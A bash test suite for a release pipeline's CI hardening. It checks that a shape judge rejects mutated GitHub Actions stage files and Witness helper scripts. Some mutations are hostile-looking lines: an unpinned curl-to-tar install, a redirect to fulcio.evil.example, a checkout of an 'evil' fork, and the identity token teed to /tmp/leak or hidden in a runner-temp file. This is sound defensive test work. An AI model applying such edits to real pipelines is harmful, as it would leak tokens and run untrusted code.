#!/usr/bin/env bash
# proves: REQ-CHAIN-004-AC1, AC2, AC3, AC6, AC8, AC9, AC10 (the flags; PR 1's verify cases cover the identity), AC11 and
#         REQ-CHAIN-005-AC1, AC2, AC4, AC5, AC6
# RED until PR 2 is implemented: the stage files rewritten, bin/build-stage-KIND.sh x4, bin/witnessed.sh, bin/chain-verify.py (bind, items-apk,
# items-merge, record-env), bin/build-admit.py, bin/install-scanner.sh witness. Tests first, step 4. Fix round 2 after step-6 round 2.
#
# Build and Rebuild: the shape of the two stage files, the four stage scripts, the one Witness helper, the job graph of release.yml and what the
# scripts DO when run against fake cache scripts (v0.3.0 rules 24, 31, 33, 38a, 38b, 39, 50, 51, 54, 58, 59, 62, 63, 68, 70).
# Runs on ubuntu-24.04 or macOS with: bash, python3 + PyYAML (apt: python3-yaml), jq, shasum. No network, no secrets, no keys.
#
# HOW IT IS BUILT (the lesson of PR 1's ten review rounds, and the owner's: readability for a human is a review item). No judge analyses shell or
# keeps a denylist. Each judge in bin/chain-test-shape.py is a FINITE EXACT GRAMMAR: a stage file is exactly the steps of one table, a stage script is
# exactly the lines of expected_lines(KIND), the Witness helper is exactly witnessed_lines(), the chain jobs of release.yml are exactly five. A
# judge is first proven on a known-good fixture and on mutated copies (a judge that cannot fail proves nothing); a few plain probes name the
# mutations a reviewer asked about, and the sweeps try every deletion, swap, suffix and insertion on every line; then the judge runs on the real tree.
#
# THE SHAPE (ratified Oct 9, owner, rule 50 wording: one stage = one workflow file = one identity; Build's two-machine matrix plus its assemble job fit):
#   stage-build.yml: job `apk` (matrix over ubuntu-24.04 and ubuntu-24.04-arm: bin/build-stage-apk.sh), job `assemble` (the VM, needs apk:
#   bin/build-stage-assemble.sh); stage-reproducibility.yml: the same two jobs (bin/build-stage-rebuild-apk.sh and -rebuild-assemble.sh). Four scripts,
#   so there is no dispatch to analyse, each a row of .github/policy/chain-scripts.json with its sha256 (PR 1's design).
#   Each job: checkout -> ./bin/install-scanner.sh witness -> the downloads (exact name and path, each into a fresh directory) -> ONE Witness
#   step, one line through bin/witnessed.sh -> the uploads (exact name, ONE path each). No witness -d: the command runs from the repo root, so Witness
#   names product subjects relative to it.
# THE ARTIFACT LAYOUT (fix round 2): actions/upload-artifact roots an artifact at the common ancestor of its paths, so every upload names ONE path.
#   The apk job uploads `out` (apks, indexes, SBOMs and the items fragment out/items-apk.json) and its record directory; the assemble job downloads
#   them into apk/<runner> and rec-apk/<runner> (Rebuild: rapk/<runner> and rec-rapk/<runner>) and `bind`s every file of apk/<runner> to the verified
#   record's products named out/... (rule 58). The assemble job writes digests.json and items.json at the repo root (Witness records
#   file:digests.json, the subject PR 1's sign --check reads, and file:items.json), the archives into dist, and uploads `out` as `images`.
# WHAT digests.json HOLDS (PROPOSED, advisor to confirm): the two image index digests, the four apk digests (cache's `apk-tool.py digest`, by name:
#   which sections it covers is cache's to change; it differs from the whole-file sha256 and ignores the signature) and the four Linux archives
#   (archive-linux-amd64, archive-linux-arm64, archive-fips-linux-amd64, archive-fips-linux-arm64: goreleaser's fscache_<ver>_linux_<arch>.tar.gz and
#   fscache-fips_...), so that Sign's provenance covers everything Release publishes (rules 35, 51). items.json holds the same plus the comparison items.
# THE VERSION (PROPOSED/UNVERIFIED, cache-3f): the stage passes --version = the tag minus the leading v (0.3.0, or 0.3.0-rc.1); cache's driver accepts
#   X.Y.Z and X.Y.Z-rc.N and names the apk fscache-0.3.0-r0.apk (final) or fscache-0.3.0_rc1-r0.apk (rc), fips as fscache-fips-.... Both forms run below.
#   The stage names no apk file: bin/build-version-check.py and `items-apk` find the apk of a variant in a directory.
# THE GH TOKEN: bin/build-admit.py gets GH_TOKEN only through the apk job's Witness step env (job permissions contents, checks, statuses, pull-requests
#   read + id-token write; advisor ruling, confirmed). The script runs `unset GH_TOKEN` right after the admission line, so cache's scripts never see it.
#
# THE WITNESS SEAM (advisor ruling; owner's amendment of rule 68): bin/witnessed.sh holds ALL the Witness flags and `timeout 540`; the judge is the
# three functions witness_seam, helper and directwitness in bin/chain-test-shape.py and the fixture side is witness_block and witnessed_text below. If
# harness spike (d) changes the wrapping, only those change; the script grammar never names Witness.
#
# CACHE'S INTERFACE (ops/handoffs/outbox/2026-10-09-cache-pipeline-interface.md; [F] = fixed by a cache test, [P] = PROPOSED/UNVERIFIED):
#   build-apk.sh --print-source-date-epoch --source-dir DIR [F]; --variant standard|fips --arch A --version V --source-dir DIR --repo DIR --keyring FILE
#   --go-archive DIR --melange-lock FILE --out DIR [F]; refuses (exit 2) APK_RELEASE_SIGNING_KEY, GOPROXY other than off, HTTPS_PROXY, --signing-key [F];
#   exit 4 = a network attempt in the sealed call [F]. assemble-image.sh --variant production|fips --version V --archive DIR --melange-repo DIR
#   --keyring-dir DIR --out DIR [F]; the config defaults to build/apko.yaml | build/apko-fips.yaml, so NO --apko-config is ever passed (AC11 B); outputs
#   OUT/V.digest (the OCI index digest), V.manifests, V.tar, V.full.lock.json [F]. The scripts do their own sudo and unshare [F]; the stage does not.
#   [P]: the archive layout constants, `bin/build-archives.py` (this lane's: the four Linux archives from the apks), the items layout, whether sudo's PATH
#   finds melange and apko, Witness's linux arm64 pin. The CLI of bin/chain-verify.py that the scripts use is documented in bin/chain-bind-test.sh
#   (bind, items-apk, items-merge, which are tested against the REAL subcommands there), bin/chain-rebuild-test.sh (rebuild-compare) and PR 1's tests.
# KNOWN LIMIT (PROPOSED/UNVERIFIED; the dry run decides): Witness loads its Fulcio signer when the command starts and takes the timestamp when it ends,
#   so a build longer than the 10-minute certificate may not verify (harness spike (d)); `timeout 540` is the answer in the tests.
# INTEGRATION BRANCH (advisor 0341): PR 2 targets chain-v030; the real-tree cases are RED here and become green on chain-v030 after PR 1 and PR 2 merge.
set -euo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
shape="$root/bin/chain-test-shape.py"; harness="$root/bin/chain-test-harness.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL PyYAML is required (apt: python3-yaml)"; exit 1; }
command -v jq > /dev/null || { echo "FAIL jq is required"; exit 1; }
ok()  { pass=$((pass + 1)); echo "ok   $1"; }
bad() { failn=$((failn + 1)); echo "FAIL $1"; }
judge() { python3 "$shape" "$@"; }
expect() { # expect ok|caught LABEL WORD judge-args...   (WORD: a word the fault message must contain, for caught)
  local want=$1 label=$2 word=$3; shift 3; local out rc=0
  out=$(judge "$@" 2>&1) || rc=$?
  if [ "$want" = ok ]; then
    if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> $out"; fi
  elif [ "$rc" = 1 ] && grep -Fq -- "$word" <<< "$out" && ! grep -q Traceback <<< "$out"; then ok "$label (caught: ${out:0:90})"
  else bad "$label -> rc=$rc, wanted a refusal containing '$word': ${out:0:160}"; fi
}
replace() { # replace SRC DST OLD NEW   (plain strings; \n is a newline in either; an OLD that is not found is a FAILURE, never a skipped case)
  python3 - "$1" "$2" "$3" "$4" <<'PY' || { bad "mutation did not apply ($(basename "$2")): $3"; return 1; }
import sys
src, dst, old, new = sys.argv[1:5]
old, new = old.replace("\\n", "\n"), new.replace("\\n", "\n")
text = open(src).read()
assert old in text, "pattern not found"
open(dst, "w").write(text.replace(old, new, 1))
PY
}
# ---- the known-good fixtures. witness_block and witnessed_text are the fixture side of the Witness seam --------------------------------
python3 - "$work" "$shape" <<'PY'
import hashlib, importlib.util, json, sys
w, shape = sys.argv[1:3]
spec = importlib.util.spec_from_file_location("shape", shape); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
UPLOAD = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"
DOWNLOAD = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65"
json.dump({"actions": [CHECKOUT, UPLOAD, DOWNLOAD]}, open(w + "/allowed-actions.json", "w"))


def witness_block(spec_):       # the stage's Witness step: one line through the helper (the fixture side of the seam, 1/2)
    env = "        env:\n          GH_TOKEN: ${{ github.token }}\n" if spec_["gh"] else ""
    run = "bash bin/witnessed.sh %s bin/build-stage-%s.sh" % (spec_["step"], spec_["kind"])
    return "      - name: %s under Witness\n%s        run: %s\n" % (spec_["step"], env, run)


def witnessed_text():           # bin/witnessed.sh, the exec line broken at its flag groups (the fixture side of the seam, 2/2)
    lines = S.witnessed_lines()
    for flag in (" --signer-fulcio-url", " -t ", " -a ", " -o "):
        lines[-1] = lines[-1].replace(flag, " \\\n  " + flag.strip() + " ", 1) if flag.endswith(" ") else lines[-1].replace(flag, " \\\n " + flag, 1)
    comment = "# run one stage script under Witness: keyless Fulcio, the timestamp authority, the attestors, `timeout 540` (rule 68)"
    return "#!/usr/bin/env bash\n" + comment + "\n" + "\n".join(lines) + "\n"


def wrap(line, width=110):      # break a long command at its option boundaries, the way a human would
    if len(line) <= width: return line
    out, current = [], ""
    for i, part in enumerate(line.split(" --")):
        piece = part if i == 0 else "--" + part
        if current and len(current) + 1 + len(piece) > width: out.append(current); current = piece
        else: current = (current + " " + piece) if current else piece
    return " \\\n  ".join(out + [current])


def stage_text(family):
    call = ""
    if family == "build":
        call = "    outputs:\n      digests:\n        description: the digests.json text, for Sign\n        value: %s\n" % S.STAGE_OUTPUT
    out = "name: 'Stage: %s'\non:\n  workflow_call:\n%spermissions:\n  contents: read\njobs:\n" % (family, call)
    for job in ("apk", "assemble"):
        sp = S.JOBS[(family, job)]
        out += "  %s:\n" % job
        out += ("    runs-on: ${{ matrix.runner }}\n    strategy:\n      matrix:\n        runner: [ubuntu-24.04, ubuntu-24.04-arm]\n" if sp["matrix"]
                else "    needs: apk\n    runs-on: ubuntu-24.04\n")
        out += "    permissions:\n" + "".join("      %s: %s\n" % kv for kv in sp["perm"].items())
        if sp.get("expose"): out += "    outputs:\n      digests: %s\n" % S.JOB_OUTPUT
        out += "    steps:\n"
        out += "      - uses: %s # v7.0.1\n        with:\n" % CHECKOUT
        out += "          persist-credentials: false\n          fetch-depth: 0\n          fetch-tags: true\n"
        out += "      - name: install Witness (pinned by checksum)\n        run: ./bin/install-scanner.sh witness\n"
        for name, path in sp["down"]: out += "      - uses: %s # v5.0.0\n        with:\n          name: %s\n          path: %s\n" % (DOWNLOAD, name, path)
        out += witness_block(sp)
        if sp.get("expose"): out += "      - id: digests\n        name: expose digests.json as the stage output\n        run: %s\n" % S.EXPOSE
        for name, path in sp["up"]: out += "      - uses: %s # v7.0.1\n        with:\n          name: %s\n          path: %s\n" % (UPLOAD, name, path)
    return out


open(w + "/build.yml", "w").write(stage_text("build"))
open(w + "/rebuild.yml", "w").write(stage_text("rebuild"))
open(w + "/witnessed.sh", "w").write(witnessed_text())
rows = []
for kind, path in S.SCRIPTS.items():
    if kind == "witnessed":
        data = open(w + "/witnessed.sh", "rb").read()
    else:
        text = "#!/usr/bin/env bash\n" + "\n".join(wrap(line) for line in S.expected_lines(kind)) + "\n"
        open("%s/s-%s.sh" % (w, kind), "w").write(text); data = text.encode()
    rows.append({"path": path, "sha256": hashlib.sha256(data).hexdigest(), "tools": []})
json.dump({"scripts": rows}, open(w + "/chain-scripts.json", "w"))
PY
cat > "$work/release.yml" <<'EOF'
name: Release
on:
  push:
    tags: ["v*"]
permissions:
  contents: read
jobs:
  build:
    if: ${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}
    uses: ./.github/workflows/stage-build.yml
  sign:
    if: ${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}
    needs: build
    permissions:
      contents: read
      id-token: write
    uses: ./.github/workflows/stage-sign.yml
    with:
      digests: ${{ needs.build.outputs.digests }}
  rebuild:
    needs: build
    uses: ./.github/workflows/stage-reproducibility.yml
  check:
    needs: build
    uses: ./.github/workflows/stage-verify.yml
  release:
    if: ${{ !inputs.dry-run }}
    needs: [rebuild, check, sign]
    uses: ./.github/workflows/stage-promote.yml
  decide:
    if: ${{ github.ref == 'refs/heads/main' && github.event_name != 'workflow_dispatch' && !inputs.dry-run }}
    runs-on: ubuntu-latest
    environment: agent
    permissions:
      contents: read
      checks: read
      id-token: write
      issues: write
    steps:
      - run: echo ${{ secrets.AUDITOR_APP_ID }}
  patch-notes:
    needs: decide
    runs-on: ubuntu-latest
    environment: agent
    permissions:
      contents: read
    steps:
      - run: echo ${{ secrets.AUDITOR_APP_ID }}
  patch-failed:
    needs: [build, release]
    runs-on: ubuntu-latest
    permissions:
      contents: read
      issues: write
    steps: []
  hostile-verify:
    needs: sign
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps: []
EOF
# ---- the stage files (REQ-CHAIN-004-AC1, AC2; REQ-CHAIN-005-AC1, AC4) ---------------------------------------------------------------
AL="$work/allowed-actions.json"
expect ok "AC1/AC2 fixture: the known-good Build stage file (apk matrix + assemble) passes" "" stage "$work/build.yml" build "$AL"
expect ok "005-AC1 fixture: the known-good Rebuild stage file passes" "" stage "$work/rebuild.yml" rebuild "$AL"
st() { # st NAME LABEL WORD OLD NEW   a mutated copy of the Build stage file must be refused with a message containing WORD
  replace "$work/build.yml" "$work/$1.yml" "$4" "$5" && expect caught "$2" "$3" stage "$work/$1.yml" build "$AL"; return 0
}
ASM='needs: apk\n    runs-on: ubuntu-24.04\n'
UPLOAD='      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n'
DOWNLOAD='      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65 # v5.0.0\n        with:\n'
st s_cont   "AC1 a container on a job (rule 62: directly on the VM)" container "$ASM" "$ASM    container: debian:12\n"
st s_svc    "AC1 services on a job" services "$ASM" "$ASM    services:\n      db: {image: x}\n"
st s_defs   "AC1 job-level defaults (a shell override)" defaults "$ASM" "$ASM    defaults:\n      run:\n        shell: bash -c \"x; bash {0}\"\n"
st s_env    "AC1 job-level env" env "$ASM" "$ASM    env:\n      A: b\n"
st s_jkey   "AC1 an unknown job key" "outside the allowlist" "$ASM" "$ASM    concurrency: x\n"
st s_juses  "AC1 a job that calls a reusable workflow instead of running steps" uses "$ASM" "$ASM    uses: ./.github/workflows/ci.yml\n"
st s_self   "AC1 a self-hosted runner in the matrix" matrix 'ubuntu-24.04-arm]' 'self-hosted]'
st s_third  "AC1 a third runner in the matrix" matrix 'ubuntu-24.04-arm]' 'ubuntu-24.04-arm, ubuntu-22.04]'
st s_one    "AC1 only one native runner (both architectures are required)" matrix 'runner: [ubuntu-24.04, ubuntu-24.04-arm]' 'runner: [ubuntu-24.04]'
st s_incl "AC1 an include entry in the matrix" matrix 'runner: [ubuntu-24.04, ubuntu-24.04-arm]' \
       'runner: [ubuntu-24.04, ubuntu-24.04-arm]\n        include:\n          - runner: ubuntu-22.04'
st s_asmarm "AC1 the assemble job on the arm runner" "assemble job must run directly on" "$ASM" 'needs: apk\n    runs-on: ubuntu-24.04-arm\n'
st s_noneed "AC1 the assemble job does not need the apk jobs" "must need exactly apk" 'needs: apk' 'needs: []'
st s_pkg    "AC1 packages: write" permissions 'id-token: write' 'id-token: write\n      packages: write'
st s_noid   "AC1 no id-token (Witness cannot sign keyless)" permissions '      id-token: write\n    steps' '    steps'
st s_nochk  "AC1 the admission job without checks: read (the required-checks check could not run)" permissions '      checks: read\n' ''
st s_wfperm "AC1 workflow-level permissions beyond contents: read" permissions 'permissions:\n  contents: read\njobs' 'permissions:\n  contents: write\njobs'
st s_push   "AC1 an extra trigger" workflow_call 'workflow_call:' 'push:\n  workflow_call:'
st s_job3 "AC1 a third job (one stage = one file = two jobs)" "exactly two jobs" '  assemble:' \
       '  third:\n    runs-on: ubuntu-24.04\n    steps: []\n  assemble:'
st s_top    "AC1 a top-level env" top-level 'permissions:\n  contents: read\njobs' 'permissions:\n  contents: read\nenv:\n  X: y\njobs'
st s_unpin  "AC2 checkout not pinned by digest" checkout 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v7'
st s_unlist "AC2 an action digest that is not on the allowed-actions list" "allowed-actions" \
       'actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a' 'actions/upload-artifact@1111111111111111111111111111111111111111'
st s_cred   "AC2 persisted credentials" "exactly" 'persist-credentials: false' 'persist-credentials: true'
st s_ref    "AC2 checkout of another ref" "exactly" 'fetch-tags: true' 'fetch-tags: true\n          ref: main'
st s_repo   "AC2 checkout of another repository" "exactly" 'fetch-tags: true' 'fetch-tags: true\n          repository: evil/fork'
st s_token  "AC2 checkout with a token" "exactly" 'fetch-tags: true' 'fetch-tags: true\n          token: ${{ secrets.X }}'
st s_shallow "AC2 a shallow checkout (build-admit needs the history and the tags)" "exactly" '          fetch-depth: 0\n' ''
st s_install "AC2 Witness installed by an unpinned download" install 'run: ./bin/install-scanner.sh witness' \
       'run: curl -sSL https://example.com/witness | tar xz -C /usr/local/bin'
st s_mid "AC2 a third-party action between the install and Witness (rule 68)" "step" '      - name: apk under Witness' \
       '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n      - name: apk under Witness'
st s_ghenv  "AC2 another token than github.token on the Witness step" "GH_TOKEN" 'GH_TOKEN: ${{ github.token }}' 'GH_TOKEN: ${{ secrets.GH_PAT }}'
st s_nogh   "AC2 the admission job without GH_TOKEN (gh cannot read the checks)" "GH_TOKEN" '        env:\n          GH_TOKEN: ${{ github.token }}\n' ''
st s_if "AC2 an if: on the Witness step" "Witness step may carry" '      - name: apk under Witness\n' \
       '      - name: apk under Witness\n        if: always()\n'
st s_shell "AC2 a shell: override on the Witness step" "Witness step may carry" '      - name: apk under Witness\n' \
       '      - name: apk under Witness\n        shell: bash -c "{0}"\n'
st s_two "AC2 a second command in the Witness step" "exactly the one line" 'run: bash bin/witnessed.sh apk bin/build-stage-apk.sh' \
       'run: |\n          bash bin/witnessed.sh apk bin/build-stage-apk.sh\n          pip install requests'
st s_direct "AC2 a direct witness run in a stage file (every stage goes through bin/witnessed.sh)" "witness run" \
       'run: bash bin/witnessed.sh apk bin/build-stage-apk.sh' 'run: witness run --step apk -- timeout 540 bash bin/build-stage-apk.sh'
st s_kind   "AC2 the apk job running the assemble script" "exactly the one line" 'bin/build-stage-apk.sh' 'bin/build-stage-assemble.sh'
st s_step "AC2 the Witness step named differently from its job (the step name selects the record path)" "exactly the one line" 'witnessed.sh apk bin' \
       'witnessed.sh build bin'
st s_outapk  "AC2 the stage output reads the apk job's output, not the assemble job's" "on: must be" 'value: ${{ jobs.assemble.outputs.digests }}' \
             'value: ${{ jobs.apk.outputs.digests }}'
st s_outnone "AC2 the stage has no digests output (Sign would get nothing)" "on: must be" \
             '    outputs:\n      digests:\n        description: the digests.json text, for Sign\n        value: ${{ jobs.assemble.outputs.digests }}\n' ''
st s_outextra "AC2 the stage exposes a second output" "on: must be" 'description: the digests.json text, for Sign' \
             'description: the digests.json text, for Sign\n      items:\n        value: ${{ jobs.assemble.outputs.digests }}'
st s_joboutstep "AC2 the assemble job's output reads a step of another job" "must expose exactly" \
             'digests: ${{ steps.digests.outputs.digests }}' 'digests: ${{ needs.apk.outputs.digests }}'
st s_joboutnone "AC2 the assemble job exposes no output" "must expose exactly" '    outputs:\n      digests: ${{ steps.digests.outputs.digests }}\n' ''
st s_exposeother "AC2 the expose step reads another file than digests.json" "id: digests" 'jq -c . digests.json' 'jq -c . items.json'
st s_exposecat  "AC2 the expose step is not the pinned form (cat of the file)" "id: digests" \
             'echo "digests=$(jq -c . digests.json)" >> "$GITHUB_OUTPUT"' 'cat digests.json >> "$GITHUB_OUTPUT"'
st s_exposeid   "AC2 the expose step has another id" "id: digests" '      - id: digests' '      - id: other'
st s_upname "AC2 an upload under another name" "upload-artifact" 'name: digests' 'name: registry-creds'
st s_uptemp "AC2 an upload of the runner temp folder (it holds the identity token)" "upload-artifact" 'path: digests.json' 'path: ${{ runner.temp }}'
st s_updot  "AC2 an upload of the whole workspace" "upload-artifact" 'path: digests.json' 'path: .'
st s_upmany "AC2 an upload of two paths (the artifact is rooted at their common ancestor, so every file name in it changes)" "ONE path" 'path: out\n' \
       'path: |\n            out\n            items-apk.json\n'
st s_upkey "AC2 an upload with an extra with: key" "upload-artifact" 'name: items\n          path: items.json' \
       'name: items\n          retention-days: 90\n          path: items.json'
st s_upmiss "AC2 a required upload missing (dist)" "steps" \
       '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: dist\n          path: dist\n' \
       ''
st s_upextra "AC2 an extra upload after the allowed ones" "no extra step" 'name: images\n          path: out\n' \
       "name: images\n          path: out\n${UPLOAD}          name: extra\n          path: out\n"
st s_dlname "AC2 a download of a name outside the table" "download-artifact" 'name: apk-ubuntu-24.04\n          path: apk/ubuntu-24.04' \
       'name: dist\n          path: apk/ubuntu-24.04'
st s_dlpin "AC2 a download not pinned by digest" "download-artifact" 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65' \
       'actions/download-artifact@v5'
st s_dldot  "AC2 a download into . (a tampered artifact could overwrite committed scripts)" "download-artifact" 'path: apk/ubuntu-24.04\n' 'path: .\n'
st s_dlbin  "AC2 a download into bin/" "download-artifact" 'path: apk/ubuntu-24.04\n' 'path: bin\n'
st s_dlsame "AC2 both architectures downloaded into the SAME directory (the amd64 apk could feed arm64)" "download-artifact" \
       'path: apk/ubuntu-24.04-arm\n' 'path: apk/ubuntu-24.04\n'
st s_dlmiss "AC2 the arm apk download missing" "steps" \
       "${DOWNLOAD}          name: apk-ubuntu-24.04-arm\n          path: apk/ubuntu-24.04-arm\n" \
       ''
st s_dlrun "AC2 a download with a run-id (it would pull another run's artifact)" "download-artifact" \
       'name: apk-ubuntu-24.04\n          path: apk/ubuntu-24.04' 'name: apk-ubuntu-24.04\n          run-id: 1\n          path: apk/ubuntu-24.04'
st s_dlapk "AC2 the Build apk job downloads something (it takes nothing from outside)" "steps" '      - name: apk under Witness' \
       "${DOWNLOAD}          name: witness-build\n          path: x\n      - name: apk under Witness"
st s_after "AC2 a third-party action after Witness" "step" \
       '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: digests' \
       '      - uses: actions/cache@0000000000000000000000000000000000000000 # v4\n        with:\n          name: digests'
st s_comp   "AC2 a local composite action step" "step" '      - name: apk under Witness' '      - uses: ./.github/actions/x\n      - name: apk under Witness'
st s_docker "AC2 a docker:// step" "step" '      - name: apk under Witness' '      - uses: docker://alpine:3\n      - name: apk under Witness'
rb() { replace "$work/rebuild.yml" "$work/$1.yml" "$4" "$5" && expect caught "$2" "$3" stage "$work/$1.yml" rebuild "$AL"; return 0; }
rb r_step "005-AC1 Rebuild's assemble Witness step is named build (Build's record path)" "exactly the one line" 'witnessed.sh rebuild bin' \
       'witnessed.sh build bin'
rb r_up   "005-AC4 Rebuild uploads anything but its verdict directory" "upload-artifact" 'name: witness-rebuild' 'name: dist'
rb r_dl "005-AC4 Rebuild downloads Build's dist (it takes only the record and the lists)" "download-artifact" \
       'name: witness-build\n          path: witness-build' 'name: dist\n          path: witness-build'
rb r_gh "005-AC1 a GH_TOKEN on Rebuild (only the admission job holds it)" "env" '      - name: rapk under Witness' \
       '      - name: rapk under Witness\n        env:\n          GH_TOKEN: ${{ github.token }}'
rb r_out "005-AC1 Rebuild exposes a stage output (Rebuild's only output is its verdict artifact)" "on: must be" 'workflow_call:\n' \
             'workflow_call:\n    outputs:\n      digests:\n        value: ${{ jobs.assemble.outputs.digests }}\n'
rb r_perm "005-AC1 Rebuild with the admission permissions" permissions 'id-token: write' 'id-token: write\n      checks: read'
replace "$work/build.yml" "$work/r_kind.yml" 'build-stage-apk.sh' 'build-stage-rebuild-apk.sh' && expect caught \
       "005-AC1 Build running the rebuild script" "exactly the one line" stage "$work/r_kind.yml" build "$AL"
expect caught "AC1 an unreadable allowed-actions list fails closed" "unreadable" stage "$work/build.yml" build "$work/does-not-exist.json"
# no workflow file is added (REQ-CHAIN-004-AC1): the v0.2.2 set, plus stage-sign.yml, minus the two files PR 2 removes
mkdir -p "$work/wf-ok" "$work/wf-new" "$work/wf-old"
for f in ci.yml release.yml scan.yml stage-build.yml stage-reproducibility.yml stage-verify.yml stage-promote.yml stage-sign.yml; do : > "$work/wf-ok/$f"; done
cp "$work/wf-ok"/* "$work/wf-new/"; : > "$work/wf-new/stage-extra.yml"
cp "$work/wf-ok"/* "$work/wf-old/"; : > "$work/wf-old/stage-admission.yml"
expect ok     "AC1 fixture: a workflow directory with stage-sign.yml and without stage-image.yml / stage-admission.yml passes" "" workflows "$work/wf-ok"
expect caught "AC1 a second new workflow file" "was added" workflows "$work/wf-new"
expect caught "AC1 stage-admission.yml still present" "still exists" workflows "$work/wf-old"
# ---- the Witness seam: bin/witnessed.sh is the only place the Witness flags and `timeout 540` live (REQ-CHAIN-004-AC2; rule 68 as amended) ------------
expect ok "AC2 fixture: the known-good bin/witnessed.sh is exactly the canonical helper" "" helper "$work/witnessed.sh"
expect ok "AC2 fixture: no stage file and no stage script names witness run" "" directwitness "$work/build.yml" "$work/rebuild.yml" "$work"/s-*.sh
hm() { replace "$work/witnessed.sh" "$work/h_$1.sh" "$3" "$4" && expect caught "$2" "helper command" helper "$work/h_$1.sh"; return 0; }
hm tnone   "AC2 no timeout (a build could outlive Fulcio's 10-minute certificate)" '-- timeout 540 bash "$@"' '-- bash "$@"'
hm t600    "AC2 timeout 600 (past the certificate's life)" '-- timeout 540' '-- timeout 600'
hm t0      "AC2 timeout 0 (no limit)" '-- timeout 540' '-- timeout 0'
hm tvar    "AC2 the limit from a variable" '-- timeout 540' '-- timeout "$T"'
hm tbefore "AC2 the timeout around Witness instead of the command (the certificate is requested before it starts)" 'exec witness run' \
       'exec timeout 540 witness run'
hm furl    "AC2 another Fulcio address" 'https://fulcio.sigstore.dev' 'http://fulcio.evil.example'
hm ftsa    "AC2 another timestamp authority" 'https://timestamp.sigstore.dev/api/v1/timestamp' 'https://tsa.example/ts'
hm fdir    "AC2 witness -d (the command must run from the repo root)" '-o "witness-$step' '-d out -o "witness-$step'
hm fextra  "AC2 an extra Witness flag" '--env-filter-sensitive-vars' '--enable-archivista --env-filter-sensitive-vars'
hm fnoflt  "AC8 no environment filter flag (tokens would be recorded)" '--env-filter-sensitive-vars' ''
hm fnokey  "AC8 no token-variable key pattern" "--env-add-sensitive-key 'ACTIONS_ID_TOKEN_REQUEST*'" ''
hm fnogh   "AC8 GH_TOKEN not on the sensitive-key list" '--env-add-sensitive-key GH_TOKEN' ''
hm fslsa   "AC2 the slsa attestor (provenance is Sign's alone)" 'environment,git,material,product' 'environment,git,material,slsa'
hm fgha    "AC8 the github attestor (it embeds the raw OIDC token)" 'environment,git,material,product' 'environment,git,github,material,product'
hm fstep   "AC2 a fixed --step instead of the closed-list argument" '--step "$step"' '--step build'
hm fout    "AC2 the record written to another path" '"witness-$step/$step-collection.json"' 'out/x.json'
hm fopen   "AC2 the step list is open" 'apk|build|rapk|rebuild' '*'
hm fexec   "AC2 witness not exec'd (its exit status could be lost)" 'exec witness run' 'witness run'
hm ftee "AC2 the token written elsewhere" '| jq -r .value)' '| jq -r .value | tee /tmp/leak)'
hm ffile "AC2 the token in a file again (the older form): a file under the runner temp folder while the command runs" \
       '<(printf %s "$tok")' '"$RUNNER_TEMP/tok"'
hm ffileb "AC2 the token written to a file before the exec" 'echo "::add-mask::$tok"' 'echo "::add-mask::$tok"\nprintf %s "$tok" > "$RUNNER_TEMP/tok"'
hm fexport "AC2 the token exported into the wrapped command's environment" 'echo "::add-mask::$tok"' 'export tok\necho "::add-mask::$tok"'
hm fnomask "AC2 the token is not masked in the log" 'echo "::add-mask::$tok"' ''
hm fcat    "AC2 the token read through a second process substitution" '<(printf %s "$tok")' '<(cat <(printf %s "$tok"))'
hm fignore "AC2 a failure of the witnessed command is ignored" '-- timeout 540 bash "$@"' '-- timeout 540 bash "$@" || true'
hm fnounset "AC2 the identity-token variables are not unset before the wrapped command runs" \
   'unset ACTIONS_ID_TOKEN_REQUEST_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL' ''
hm fnounsetrt "AC2 the runtime-token variables are not unset before the wrapped command runs" 'unset ACTIONS_RUNTIME_TOKEN ACTIONS_RUNTIME_URL\n' ''
hm fkeep   "AC2 a comment ending in a backslash hides a copy of the token (bash runs the cp line)" \
   'unset ACTIONS_ID_TOKEN_REQUEST_TOKEN' '# token kept \\ncp /dev/null "$RUNNER_TEMP/tok"\nunset ACTIONS_ID_TOKEN_REQUEST_TOKEN'
{ cat "$work/witnessed.sh"; echo "witness run --step x -- true"; } > "$work/h_second.sh"
expect caught "AC2 a second witness invocation in the helper" "helper command" helper "$work/h_second.sh"
{ echo "# a different comment, which a human may add"; cat "$work/witnessed.sh"; } > "$work/h_comment.sh"
expect ok "AC2 comments in the helper are not commands" "" helper "$work/h_comment.sh"
printf 'set -euo pipefail\nwitness run --step apk -- timeout 540 bash bin/build-stage-apk.sh\n' > "$work/direct.sh"
expect caught "AC2 a stage script naming witness run directly" "witness run" directwitness "$work/direct.sh"
# ---- the four stage scripts: an EXACT line grammar (REQ-CHAIN-004-AC3, AC6, AC11; REQ-CHAIN-005-AC2) --------------------------------------
KINDS="apk assemble rebuild-apk rebuild-assemble"
for k in $KINDS; do
  expect ok "AC3 fixture: the known-good bin/build-stage-$k.sh is exactly the grammar (long lines broken with backslashes)" "" script "$work/s-$k.sh" "$k"
done
